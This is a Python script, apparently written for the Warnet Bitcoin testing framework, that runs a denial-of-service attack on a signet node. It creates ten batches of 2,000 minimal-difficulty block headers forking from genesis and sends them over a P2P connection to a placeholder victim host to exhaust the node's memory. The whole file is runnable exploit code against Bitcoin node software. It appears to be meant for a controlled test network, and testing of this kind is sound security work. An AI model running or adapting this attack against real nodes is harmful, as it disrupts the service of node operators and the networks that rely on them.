#!/usr/bin/env python3

import socket
from commander import Commander
from test_framework.messages import msg_headers, hash256
from test_framework.p2p import P2PInterface, MAGIC_BYTES
from test_framework.blocktools import (
    NORMAL_GBT_REQUEST_PARAMS,
    create_block,
)


def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


class DOSHeadersTest(Commander):
    def set_test_params(self):
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = "Test DOS vulnerability using headers in signet"
        parser.usage = "warnet run dos_headers_test.py --debug"

    def create_attack_headers(self, node, num_headers):
        """Create a large number of headers forking from genesis"""
        headers = []
        # Start from genesis block
        hashPrevBlock = int(node.getblockhash(0), 16)

        for i in range(num_headers):
            # Create blocks with minimal difficulty
            block = create_block(
                hashprev=hashPrevBlock,
                tmpl=node.getblocktemplate(NORMAL_GBT_REQUEST_PARAMS),
            )
            # Don't bother with real PoW, just solve with minimal difficulty
            block.solve()
            headers.append(block)
            hashPrevBlock = block.sha256

            if i % 100 == 0:
                self.log.info(f"Created {i} headers")

        return headers

    def run_test(self):
        # Target the vulnerable node
        victim = "TARGET_TANK_NAME.default.svc"

        # Get victim's address
        dstaddr = socket.gethostbyname(victim)
        dstport = 38333  # Signet port

        # Set up signet magic bytes
        MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        self.log.info(f"Starting DOS headers attack against {victim}")

        # Create P2P connection
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        try:
            # We'll send multiple batches of headers
            HEADERS_PER_BATCH = 2000  # Maximum allowed in a single message
            NUM_BATCHES = 10  # Send multiple batches to fill up memory

            self.log.info(
                f"Sending {NUM_BATCHES} batches of {HEADERS_PER_BATCH} headers each..."
            )

            for batch in range(NUM_BATCHES):
                self.log.info(f"Creating and sending batch {batch + 1}")

                # Create headers that fork from genesis
                headers = self.create_attack_headers(self.nodes[0], HEADERS_PER_BATCH)

                # Send headers message
                headers_message = msg_headers(headers=headers)
                attacker.send_and_ping(headers_message)

                self.log.info(f"Sent batch {batch + 1} of headers")

            self.log.info("Headers DOS attack completed")

        except Exception as e:
            self.log.error(f"Attack failed with error: {str(e)}")
            raise

        finally:
            self.log.info("Cleaning up connection")
            if attacker:
                attacker.peer_disconnect()


if __name__ == "__main__":
    DOSHeadersTest().main()
